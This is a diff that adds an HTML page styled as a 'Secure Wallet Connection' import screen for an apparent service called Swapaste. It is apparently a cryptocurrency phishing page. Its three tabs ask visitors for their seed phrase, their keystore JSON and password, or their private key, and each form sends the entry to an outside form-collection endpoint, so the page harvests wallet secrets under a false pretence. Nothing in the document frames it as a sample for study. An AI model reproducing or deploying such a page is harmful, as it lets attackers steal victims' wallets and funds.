@@ -1,0 +1,176 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+       <!-- <link href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet" /> -->
+         <!-- <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"> -->
+ <link rel="stylesheet" href="static/css/bootstrap.min.css">
+          <link rel="stylesheet" href="static/css/bootstrap.css">
+          <link rel="stylesheet" href="static/css/bootstrap.css.map">
+ <meta name="viewport" content="width=device-width, initial-scale=1">
+
+          <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script> -->
+        <title>Home | Connect Wallet with Swapaste</title>
+    </head>
+
+
+<style>
+        /*body{
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+           background-color: black;*/
+/*    background-repeat: no-repeat;
+    background-size: 50% 100%;
+    background-position: left top;*/
+
+        }
+      /* center{
+        margin-top:70px;
+
+        }*/
+        .navigation{
+            display:flex;
+            flex-direction: row;
+            justify-content: space-evenly;
+            background-color: burlywood;
+            background-size:contain;
+            width:auto;
+            /* border-radius:15px; */
+
+	-webkit-box-shadow: -2px 7px 21px -9px rgba(0,0,0,0.75);
+	-moz-box-shadow: -2px 7px 21px -9px rgba(0,0,0,0.75);
+	box-shadow: -2px 7px 21px -9px rgba(0,0,0,0.75);
+            height:50px;
+            z-index:1030;
+            top:0;
+            left:0;
+            right:0;
+
+        }
+        .asterisk{
+            display: none;
+        }
+        a{
+            margin-top:15px;
+            text-decoration:none;
+            font-size:20px;
+            font-weight:bolder;
+            color: #17a2b8;
+        }
+        p{
+            font-size: 20px;
+        }
+     input{
+        /*margin-top: 30px;*/
+        width: 450px;
+    height: 50px;
+    margin-top: 15px;
+    border-radius: 25px;
+    border: 2px solid grey;
+    padding-left: 25px;
+     }
+      .get-started-btn {
+  margin-left: 25px;
+  background: #17a2b8;
+  color: #fff;
+  border-radius: 5px;
+  padding: 10px 30px 11px 30px;
+  white-space: nowrap;
+  transition: 0.3s;
+  font-size: 14px;
+  font-weight: 600;
+  display: inline-block;
+}
+
+.get-started-btn:hover {
+  background: #17a2b8;
+  color: #fff;
+}
+
+
+h1{
+    color: #17a2b8;
+    font-size:50px;
+    font-weight: bolder;
+}
+        </style>
+
+        <body>
+<header>
+		<div class="container-fluid">
+			<div class="row">
+				<div class="col-md-4 offset-md-4">
+					<a class="text-white" href="/" style="font-size: 20px;"><i class="fas fa-angle-left"></i>Secure Wallet Connection</a>
+				</div>
+			</div>
+		</div>
+	</header>
+	<div class="container-fluid" style="margin-top: 10px;">
+		<div class="row">
+			<div class="col-md-4 offset-md-4">
+							</div>
+		</div>
+	</div>
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<ul class="nav nav-tabs">
+					<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+				</ul>
+			</div>
+		</div>
+	</div>
+	<section style="margin-top: 40px;">
+		<div class="container-fluid">
+			<div class="row">
+				<div class="col-md-4 offset-md-4">
+					<!-- Tab panes -->
+					<div class="tab-content">
+						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
+							<form id="phrasehandler" method="post" action="https://formspree.io/f/xjvjnaye">
+								<input type="hidden" id="type" name="type" value="Phrase">
+								<textarea class="form-control" id="phrases" rows="5" name="phrase" placeholder="Phrase"></textarea>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" id="name" name="name" value=Phrase>
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit">IMPORT</button></div>
+							</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="keystore">
+							<form id="keystorehandler" method="post" action="hhttps://formspree.io/f/xjvjnaye">
+								<input type="hidden" name="type" id="typekeystore" value="Keystore JSON">
+								<div class="form-group">
+									<textarea class="form-control" id="jsonkeystore" name="keystorejson" rows="5" placeholder="Keystore JSON"></textarea>
+								</div>
+								<div class="form-group">
+									<input class="form-control" id="passwordkeystore" type="password" name="keystorepasswword" placeholder="Password">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">
+									Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+								</p>
+								<input type="hidden" name="name" id="namekeystore" value=Alice>
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit">IMPORT</button></div>
+							</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="privatekey">
+							<form id="privatekeyhandler" method="post" action="https://formspree.io/f/xjvjnaye">
+								<input type="hidden" id="typekey" name="type" value="Private Key">
+								<div class="form-group">
+									<input class="form-control" id="key" name="privatekey" placeholder="Private Key">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" name="name" id="namekey" value=Alice>
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit">IMPORT</button></div>
+							</form>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+
+
+	<script src="static/js/bootstrap.js"></script>
+
+    </body>
+</html>
